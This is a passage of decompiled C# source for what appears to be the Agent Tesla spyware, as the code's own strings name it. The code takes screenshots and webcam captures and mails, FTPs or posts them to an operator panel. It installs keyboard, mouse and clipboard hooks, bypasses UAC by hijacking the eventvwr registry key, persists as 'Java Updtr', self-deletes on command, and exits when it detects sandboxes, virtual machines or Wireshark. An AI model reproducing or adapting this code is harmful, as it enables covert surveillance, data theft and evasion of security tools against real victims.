                string body = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + GetInfo(InfoTypes.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.AmountOfMemory) + "<br>VideocardName&nbsp;: " + GetInfo(InfoTypes.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + GetInfo(InfoTypes.VideocardMem) + "<br>=================================================</span>";
                Sendmail("%toemail%", subject, body, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg", "");
            }
            else if (LogType == "ftp")
            {
                string str5 = "yyyy_MM_dd_HH_mm_ss";
                UploadFTPImage(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg", "Agent_Tesla_Screenshot_" + computer_name.Replace("/", "-") + "_" + DateTime.Now.ToString(str5) + ".jpeg");
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            ProjectData.ClearProjectError();
        }
    }

    private static void Sendwebcam_Tick(object sender, EventArgs e)
    {
        try
        {
            PictureBox box = new PictureBox();
            mCapHwnd = capCreateCaptureWindowA("WebCap", 0x50000000, 0, 0, box.Size.Width, box.Size.Height, box.Handle.ToInt32(), 0);
            if (SendMessage(mCapHwnd, 0x40a, 0, 0) > 0)
            {
                SendMessage(mCapHwnd, 0x434, 30, 0);
                SendMessage(mCapHwnd, 0x432, 1, 0);
                SendMessage(mCapHwnd, 0x43c, 0, 0);
                SendMessage(mCapHwnd, 0x41e, 0, 0);
                if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture"))
                {
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture");
                    System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture", FileAttributes.Hidden);
                }
                System.Windows.Forms.Clipboard.GetImage().Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg", ImageFormat.Jpeg);
                SendMessage(mCapHwnd, 0x40b, mCapHwnd, 0);
                DateTime now = DateTime.Now;
                string format = "MM/dd/yyyy HH:mm:ss";
                if (LogType == "webpanel")
                {
                    string str2 = Convert.ToBase64String(System.IO.File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg"));
                    postdata($"type={"webcam"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&webcam_screen={str2}&client={null}&link={null}&username={null}&password={null}&screen_link={null}");
                }
                else if (LogType == "smtp")
                {
                    string subject = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Webcam Capture From: " + GetExternalIp() + "  [Agent Tesla]";
                    string body = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + GetInfo(InfoTypes.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.AmountOfMemory) + "<br>VideocardName&nbsp;: " + GetInfo(InfoTypes.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + GetInfo(InfoTypes.VideocardMem) + "<br>=================================================</span>";
                    Sendmail("%toemail%", subject, body, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg", "");
                }
                else if (LogType == "ftp")
                {
                    string str5 = "yyyy_MM_dd_HH_mm_ss";
                    UploadFTPImage(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg", "Agent_Tesla_Webcam_" + computer_name.Replace("/", "-") + "_" + DateTime.Now.ToString(str5) + ".jpeg");
                }
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
    }

    private static void SetFileBypassUAC(string fileLocation)
    {
        if ((Conversions.ToInteger(MyProject.Computer.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "1")) != 0) && System.IO.File.Exists(fileLocation))
        {
            try
            {
                string pathRoot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
                string str4 = @"Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
                string str = Path.Combine(pathRoot, str4);
                string str2 = $"{str} Start-Process -FilePath "{fileLocation}" -wait";
                using (RegistryKey key = Registry.CurrentUser)
                {
                    using (RegistryKey key2 = key.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command"))
                    {
                        key2.SetValue("", str2, RegistryValueKind.String);
                    }
                }
                Process.Start("eventvwr.exe");
                Thread.Sleep(0x1388);
                Registry.CurrentUser.DeleteSubKeyTree(@"SOFTWARE\Classes\mscfile");
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
        }
    }

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool SetKernelObjectSecurity(IntPtr ProcessHandle, int SI, [In] byte[] psdesc);
    private static void state_sub()
    {
        System.Timers.Timer timer = new System.Timers.Timer();
        timer.Elapsed += new ElapsedEventHandler(X.state_Tick);
        timer.Enabled = true;
        timer.Interval = 1000.0;
        timer.Start();
    }

    private static void state_Tick(object sender, ElapsedEventArgs e)
    {
        lastInputInf.cbSize = Marshal.SizeOf(lastInputInf);
        lastInputInf.dwTime = 0;
        GetLastInputInfo(ref lastInputInf);
        if (((int) Math.Round((double) (((double) (Environment.TickCount - lastInputInf.dwTime)) / 1000.0))) > 600)
        {
            pc_state = false;
        }
        else
        {
            pc_state = true;
        }
    }

    public static void Task(object sender, ElapsedEventArgs e)
    {
        try
        {
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            ProjectData.ClearProjectError();
        }
    }

    [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpChar, int cchBuff, uint wFlags, IntPtr dwhkl);
    private static void uninstall_server(object sender, ElapsedEventArgs e)
    {
        try
        {
            if (postdata($"type={"uninstall"}&hwid={hwid_id}&time={null}&pcname={null}&logdata={null}&screen={null}&ipadd={null}&webcam_link={null}&client={null}&link={null}&username={null}&password={null}&screen_link={null}").Contains("uninstall"))
            {
                try
                {
                    Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).DeleteValue("Load");
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("Java Updtr");
                }
                catch (Exception exception2)
                {
                    ProjectData.SetProjectError(exception2);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    Melt();
                }
                catch (Exception exception3)
                {
                    ProjectData.SetProjectError(exception3);
                    ProjectData.ClearProjectError();
                }
                Application.Exit();
            }
        }
        catch (Exception exception4)
        {
            ProjectData.SetProjectError(exception4);
            ProjectData.ClearProjectError();
        }
    }

    public static void uninstall_sub()
    {
        try
        {
            if (postdata($"type={"uninstall"}&hwid={hwid_id}&time={null}&pcname={null}&logdata={null}&screen={null}&ipadd={null}&webcam_link={null}&client={null}&link={null}&username={null}&password={null}&screen_link={null}").Contains("uninstall"))
            {
                try
                {
                    Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).DeleteValue("Load");
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("Java Updtr");
                }
                catch (Exception exception2)
                {
                    ProjectData.SetProjectError(exception2);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    Melt();
                }
                catch (Exception exception3)
                {
                    ProjectData.SetProjectError(exception3);
                    ProjectData.ClearProjectError();
                }
                Application.Exit();
            }
        }
        catch (Exception exception4)
        {
            ProjectData.SetProjectError(exception4);
            ProjectData.ClearProjectError();
        }
    }

    public static void update_sub()
    {
        try
        {
            postdata($"type={"update"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&webcam_link={null}&client={null}&link={null}&username={null}&password={null}&screen_link={null}");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
    }

    public static void UploadFTP(string Filename, string Data)
    {
        try
        {
            FtpWebRequest request = (FtpWebRequest) WebRequest.Create("ftp://" + Filename);
            request.Credentials = new NetworkCredential("u", "p");
            request.Method = "STOR";
            object bytes = Encoding.UTF8.GetBytes(Data);
            request.ContentLength = Conversions.ToLong(NewLateBinding.LateGet(bytes, null, "Length", new object[0], null, null, null));
            object requestStream = request.GetRequestStream();
            object[] objArray = new object[3];
            objArray[0] = RuntimeHelpers.GetObjectValue(bytes);
            objArray[1] = 0;
            object instance = bytes;
            objArray[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, null, "Length", new object[0], null, null, null));
            object[] arguments = objArray;
            bool[] copyBack = new bool[] { true, false, true };
            NewLateBinding.LateCall(requestStream, null, "Write", arguments, null, null, copyBack, true);
            if (copyBack[0])
            {
                bytes = RuntimeHelpers.GetObjectValue(arguments[0]);
            }
            if (copyBack[2])
            {
                NewLateBinding.LateSetComplex(instance, null, "Length", new object[] { RuntimeHelpers.GetObjectValue(arguments[2]) }, null, null, true, false);
            }
            NewLateBinding.LateCall(requestStream, null, "Close", new object[0], null, null, null, true);
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            ProjectData.ClearProjectError();
        }
    }

    public static void UploadFTPImage(string Filepath, string Filename)
    {
        try
        {
            FtpWebRequest request = (FtpWebRequest) WebRequest.Create("ftp:///" + Filename);
            request.Credentials = new NetworkCredential("u", "p");
            request.Method = "STOR";
            byte[] buffer = System.IO.File.ReadAllBytes(Filepath);
            Stream requestStream = request.GetRequestStream();
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
            requestStream.Dispose();
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            ProjectData.ClearProjectError();
        }
    }

    public static XmlDocument UploadImage(string imageAsBase64String)
    {
        XmlDocument document;
        try
        {
            using (object obj2 = new WebClient())
            {
                string str = "3ce63074cd9dcf8";
                NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, null, "Headers", new object[0], null, null, null), null, "Add", new object[] { "Authorization", Convert.ToString("Client-ID ") + str }, null, null, null, true);
                object instance = new NameValueCollection();
                object[] arguments = new object[] { "image", imageAsBase64String };
                bool[] copyBack = new bool[] { false, true };
                NewLateBinding.LateCall(instance, null, "add", arguments, null, null, copyBack, true);
                if (copyBack[1])
                {
                    imageAsBase64String = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[1]), typeof(string));
                }
                object[] objArray = new object[] { "https://api.imgur.com/3/upload.xml", RuntimeHelpers.GetObjectValue(instance) };
                copyBack = new bool[] { false, true };
                if (copyBack[1])
                {
                    instance = RuntimeHelpers.GetObjectValue(objArray[1]);
                }
                byte[] buffer = (byte[]) NewLateBinding.LateGet(obj2, null, "UploadValues", objArray, null, null, copyBack);
                XmlDocument document2 = new XmlDocument();
                using (MemoryStream stream = new MemoryStream(buffer))
                {
                    document2.Load(stream);
                }
                return document2;
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            document = null;
            ProjectData.ClearProjectError();
        }
        return document;
    }

    public static void victim_update_Tick(object sender, ElapsedEventArgs e)
    {
        try
        {
            postdata($"type={"update"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&webcam_link={null}&client={null}&link={null}&username={null}&password={null}&screen_link={null}");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
    }

    private static string VKCodeToUnicode(uint VKCode)
    {
        try
        {
            StringBuilder lpChar = new StringBuilder();
            byte[] lpKeyState = new byte[0xff];
            if (!GetKeyboardState(lpKeyState))
            {
                return "";
            }
            uint wScanCode = MapVirtualKey(VKCode, 0);
            IntPtr foregroundWindow = (IntPtr) GetForegroundWindow();
            int lpdwProcessID = 0;
            IntPtr keyboardLayout = (IntPtr) GetKeyboardLayout(GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID));
            ToUnicodeEx(VKCode, wScanCode, lpKeyState, lpChar, 5, 0, keyboardLayout);
            return lpChar.ToString();
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            ProjectData.ClearProjectError();
        }
        return ((Keys) ((int) VKCode)).ToString();
    }

    public static void webfilterr(object sender, ElapsedEventArgs e)
    {
        string[] strArray = new string[] { "%filter_list%" };
        if (strArray.Length != 0)
        {
            foreach (Process process in Process.GetProcesses())
            {
                int num3 = strArray.Length - 1;
                for (int i = 0; i <= num3; i++)
                {
                    try
                    {
                        if (process.MainWindowTitle.ToLower().Contains(strArray[i].ToLower()))
                        {
                            process.Kill();
                        }
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        Exception exception = exception1;
                        ProjectData.ClearProjectError();
                    }
                }
            }
        }
    }

    public static void zxc(object sender, EventArgs e)
    {
        if (Process.GetProcessesByName("DF5Serv").Length >= 1)
        {
            Application.Exit();
        }
        if (MyProject.Computer.FileSystem.CurrentDirectory.ToLower().Contains("sample"))
        {
            Application.Exit();
        }
        if (Process.GetCurrentProcess().MainModule.FileName.ToLower().Contains("sample"))
        {
            Application.Exit();
        }
        foreach (Process process2 in Process.GetProcesses())
        {
            if ((process2.ProcessName.ToLower() == "sandboxierpcss") && (Process.GetCurrentProcess().SessionId == process2.SessionId))
            {
                Application.Exit();
            }
        }
        if (Process.GetProcessesByName("VBoxservice").Length >= 1)
        {
            Application.Exit();
        }
        if (Process.GetProcessesByName("vmwareservice").Length >= 1)
        {
            Application.Exit();
        }
        if ((Process.GetProcessesByName("vpcmap").Length >= 4) & (Process.GetProcessesByName("vmsrvc").Length >= 4))
        {
            Application.Exit();
        }
        foreach (Process process in Process.GetProcesses())
        {
            if (process.MainWindowTitle.Contains("Wireshark"))
            {
                Application.Exit();
            }
        }
    }

    private static Clipboard CH
    {
        get => 
            _CH;
        [MethodImpl(MethodImplOptions.Synchronized)]
        set
        {
            if (_CH != null)
            {
                _CH.Changed -= new Clipboard.ChangedEventHandler(X.CH_Changed);
            }
            _CH = value;
            if (_CH != null)
            {
                _CH.Changed += new Clipboard.ChangedEventHandler(X.CH_Changed);
            }
        }
    }

    private static KeyboardHook kbHook
    {
        get => 
            _kbHook;
        [MethodImpl(MethodImplOptions.Synchronized)]
        set
        {
            if (_kbHook != null)
            {
                KeyboardHook.KeyUp -= new KeyboardHook.KeyUpEventHandler(X.kbHook_KeyUp);
                KeyboardHook.KeyDown -= new KeyboardHook.KeyDownEventHandler(X.kbHook_KeyDown);
            }
            _kbHook = value;
            if (_kbHook != null)
            {
                KeyboardHook.KeyUp += new KeyboardHook.KeyUpEventHandler(X.kbHook_KeyUp);
                KeyboardHook.KeyDown += new KeyboardHook.KeyDownEventHandler(X.kbHook_KeyDown);
            }
        }
    }

    private static Mouse MH
    {
        get => 
            _MH;
        [MethodImpl(MethodImplOptions.Synchronized)]
        set
        {
            if (_MH != null)
            {
                _MH.Click -= new Mouse.ClickEventHandler(X.MH_Click);
                _MH.Move -= new Mouse.MoveEventHandler(X.MH_Move);
            }
            _MH = value;
            if (_MH != null)
            {
                _MH.Click += new Mouse.ClickEventHandler(X.MH_Click);
                _MH.Move += new Mouse.MoveEventHandler(X.MH_Move);
            }
        }
    }

    internal static System.Windows.Forms.Timer Sendwebcam
    {
        get => 
            _Sendwebcam;
        [MethodImpl(MethodImplOptions.Synchronized)]
        set
        {
            if (_Sendwebcam != null)
            {
                _Sendwebcam.Tick -= new EventHandler(X.Sendwebcam_Tick);
            }
            _Sendwebcam = value;
            if (_Sendwebcam != null)
            {
                _Sendwebcam.Tick += new EventHandler(X.Sendwebcam_Tick);
            }
        }
    }

    public class Clipboard : NativeWindow
    {
        private IntPtr ID;

        public event ChangedEventHandler Changed;

        public Clipboard()
        {
            this.CreateHandle(new CreateParams());
        }

        [DllImport("user32", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern bool ChangeClipboardChain(IntPtr handle, IntPtr next);
        protected override void Finalize()
        {
            this.Uninstall();
        }

        public void Install()
        {
            this.ID = SetClipboardViewer(this.Handle);
        }

        [DllImport("user32", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern long SendMessage(IntPtr handle, int code, IntPtr flags, IntPtr data);
        [DllImport("user32", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern IntPtr SetClipboardViewer(IntPtr handle);
        public void Uninstall()
        {
            ChangeClipboardChain(this.Handle, this.ID);
        }

        protected override void WndProc(ref System.Windows.Forms.Message m)
        {
            switch (m.Msg)
            {
                case 0x308:
                {
                    ChangedEventHandler changedEvent = this.ChangedEvent;
                    if (changedEvent != null)
                    {
                        changedEvent(this);
                    }
                    SendMessage(this.ID, m.Msg, m.WParam, m.LParam);
                    break;
                }
                case 0x30d:
                    if (!(m.WParam == this.ID))
                    {
                        SendMessage(this.ID, m.Msg, m.WParam, m.LParam);
                        break;
                    }
                    this.ID = m.LParam;
                    break;
            }
            base.WndProc(ref m);
        }

        public delegate void ChangedEventHandler(X.Clipboard sender);
    }

    public enum InfoTypes
    {
        OperatingSystemName,
        ProcessorName,
        AmountOfMemory,
        VideocardName,
        VideocardMem
    }

    public class KeyboardHook
    {
        private const int HC_ACTION = 0;
        private IntPtr HHookID;
        private KBDLLHookProc KBDLLHookProcDelegate;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x100;
        private const int WM_KEYUP = 0x101;
        private const int WM_SYSKEYDOWN = 260;
        private const int WM_SYSKEYUP = 0x105;

        public static  event KeyDownEventHandler KeyDown;

        public static  event KeyUpEventHandler KeyUp;

        public KeyboardHook()
        {
            this.KBDLLHookProcDelegate = new KBDLLHookProc(this.KeyboardProc);
            this.HHookID = IntPtr.Zero;
            try
            {
                int num = 0;
                do
                {
                    this.HHookID = (IntPtr) SetWindowsHookEx(13, this.KBDLLHookProcDelegate, (IntPtr) Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
                    if (this.HHookID != IntPtr.Zero)
                    {
                        return;
                    }
                    num++;
                }
                while (num <= 10);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        [DllImport("User32.dll", CallingConvention=CallingConvention.StdCall, CharSet=CharSet.Auto)]
        private static extern int CallNextHookEx(int idHook, int nCode, IntPtr wParam, IntPtr lParam);
        protected override void Finalize()
        {
            if (!(this.HHookID == IntPtr.Zero))
            {
                UnhookWindowsHookEx((int) this.HHookID);
            }
            base.Finalize();
        }

        private int KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode == 0)
            {
                KBDLLHOOKSTRUCT kbdllhookstruct;
                KBDLLHOOKSTRUCT kbdllhookstruct3;
                IntPtr ptr = wParam;
                if ((ptr == ((IntPtr) 0x100)) || (ptr == ((IntPtr) 260)))
                {
                    KeyDownEventHandler keyDownEvent = KeyDownEvent;
                    if (keyDownEvent != null)
                    {
                        kbdllhookstruct3 = (KBDLLHOOKSTRUCT) Marshal.PtrToStructure(lParam, kbdllhookstruct.GetType());
                        keyDownEvent((Keys) ((int) kbdllhookstruct3.vkCode));
                    }
                }
                else if ((ptr == ((IntPtr) 0x101)) || (ptr == ((IntPtr) 0x105)))
                {
                    KeyUpEventHandler keyUpEvent = KeyUpEvent;
                    if (keyUpEvent != null)
                    {
                        kbdllhookstruct3 = (KBDLLHOOKSTRUCT) Marshal.PtrToStructure(lParam, kbdllhookstruct.GetType());
                        keyUpEvent((Keys) ((int) kbdllhookstruct3.vkCode));
                    }
                }
            }
            return CallNextHookEx((int) IntPtr.Zero, nCode, wParam, lParam);
        }

        [DllImport("User32.dll", CallingConvention=CallingConvention.StdCall, CharSet=CharSet.Auto)]
        private static extern int SetWindowsHookEx(int idHook, KBDLLHookProc HookProc, IntPtr hInstance, int wParam);
        [DllImport("User32.dll", CallingConvention=CallingConvention.StdCall, CharSet=CharSet.Auto)]
        private static extern bool UnhookWindowsHookEx(int idHook);

        private delegate int KBDLLHookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public X.KeyboardHook.KBDLLHOOKSTRUCTFlags flags;
            public uint time;
            public UIntPtr dwExtraInfo;
        }

        [Flags]
        private enum KBDLLHOOKSTRUCTFlags : uint
        {
            LLKHF_ALTDOWN = 0x20,
            LLKHF_EXTENDED = 1,
            LLKHF_INJECTED = 0x10,
            LLKHF_UP = 0x80
        }

        public delegate void KeyDownEventHandler(Keys Key);

        public delegate void KeyUpEventHandler(Keys Key);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LASTINPUTINFO
    {
        [MarshalAs(UnmanagedType.U4)]
        public int cbSize;
        [MarshalAs(UnmanagedType.U4)]
        public int dwTime;
    }

    public class Mouse
    {
        private HP MD;
        private int MH;
        private Point Prior;

        public event ClickEventHandler Click;

        public event DoubleClickEventHandler DoubleClick;

        public event DownEventHandler Down;

        public event MoveEventHandler Move;

        public event UpEventHandler Up;

        public event WheelEventHandler Wheel;

        [DllImport("user32", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern int CallNextHookEx(IntPtr handle, int code, int flags, object data);
        public void Install()
        {
            this.MD = new HP(this.Process);
            this.MH = SetWindowsHookExA(14, this.MD, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
        }

        private int Process(int Code, int Flags, ref MouseData Data)
        {
            int num;
            if (Code == 0)
            {
                int num2;
                bool flag;
                int num3;
                MouseButtons left;
                bool flag2;
                switch (Flags)
                {
                    case 0x201:
                        flag = true;
                        left = MouseButtons.Left;
                        num3 = 1;
                        break;

                    case 0x202:
                        flag2 = true;
                        left = MouseButtons.Left;
                        num3 = 1;
                        break;

                    case 0x203:
                        left = MouseButtons.Left;
                        num3 = 2;
                        break;

                    case 0x204:
                        flag = true;
                        left = MouseButtons.Right;
                        num3 = 1;
                        break;

                    case 0x205:
                        flag2 = true;
                        left = MouseButtons.Right;
                        num3 = 1;
                        break;

                    case 0x206:
                        left = MouseButtons.Right;
                        num3 = 2;
                        break;

                    case 0x207:
                        flag = true;
                        left = MouseButtons.Middle;
                        num3 = 1;
                        break;

                    case 520:
                        flag2 = true;
                        left = MouseButtons.Middle;
                        num3 = 1;
                        break;

                    case 0x209:
                        left = MouseButtons.Middle;
                        num3 = 2;
                        break;

                    case 0x20a:
                        num2 = Data.Code >> 0x10;
                        break;
                }
                MouseEvent e = new MouseEvent(left, num3, num2, Data.Point);
                if (flag2)
                {
                    UpEventHandler upEvent = this.UpEvent;
                    if (upEvent != null)
                    {
                        upEvent(this, ref e);
                    }
                }
                if (flag)
                {
                    DownEventHandler downEvent = this.DownEvent;
                    if (downEvent != null)
                    {
                        downEvent(this, ref e);
                    }
                }
                if (num3 > 0)
                {
                    ClickEventHandler clickEvent = this.ClickEvent;
                    if (clickEvent != null)
                    {
                        clickEvent(this, ref e);
                    }
                }
                if (num3 == 2)
                {
                    DoubleClickEventHandler doubleClickEvent = this.DoubleClickEvent;
                    if (doubleClickEvent != null)
                    {
                        doubleClickEvent(this, ref e);
                    }
                }
                if (Data.Point != this.Prior)
                {
                    this.Prior = Data.Point;
                    MoveEventHandler moveEvent = this.MoveEvent;
                    if (moveEvent != null)
                    {
                        moveEvent(this, ref e);
                    }
                }
                if (num2 != 0)
                {
                    WheelEventHandler wheelEvent = this.WheelEvent;
                    if (wheelEvent != null)
                    {
                        wheelEvent(this, ref e);
                    }
                }
                if (e.Handled)
                {
                    return -1;
                }
            }
            return num;
        }

        [DllImport("user32", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern int SetWindowsHookExA(int type, Delegate pointer, IntPtr handle, int thread);
        [DllImport("user32", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern int UnhookWindowsHookEx(int handle);
        public int Uninstall() => 
            UnhookWindowsHookEx(this.MH);

        public delegate void ClickEventHandler(object sender, ref X.Mouse.MouseEvent e);

        public delegate void DoubleClickEventHandler(object sender, ref X.Mouse.MouseEvent e);

        public delegate void DownEventHandler(object sender, ref X.Mouse.MouseEvent e);

        private delegate int HP(int code, int flags, ref X.Mouse.MouseData data);

        [StructLayout(LayoutKind.Sequential)]
        private struct MouseData
        {
            public System.Drawing.Point Point;
            public int Code;
            public int Flags;
            public int Time;
            public int Info;
        }

        [StructLayout(LayoutKind.Sequential), EditorBrowsable(EditorBrowsableState.Never)]
        public struct MouseEvent
        {
            public readonly MouseButtons Button;
            public readonly int Clicks;
            public readonly int Delta;
            public readonly Point Location;
            private bool _Handled;
            public bool Handled
            {
                get => 
                    this._Handled;
                set
                {
                    this._Handled = value;
                }
            }
            public MouseEvent(MouseButtons _button, int _clicks, int _delta, Point _location)
            {
                this = new X.Mouse.MouseEvent();
                this.Button = _button;
                this.Clicks = _clicks;
                this.Delta = _delta;
                this.Location = _location;
            }
        }

        public delegate void MoveEventHandler(object sender, ref X.Mouse.MouseEvent e);

        public delegate void UpEventHandler(object sender, ref X.Mouse.MouseEvent e);

        public delegate void WheelEventHandler(object sender, ref X.Mouse.MouseEvent e);
    }
}

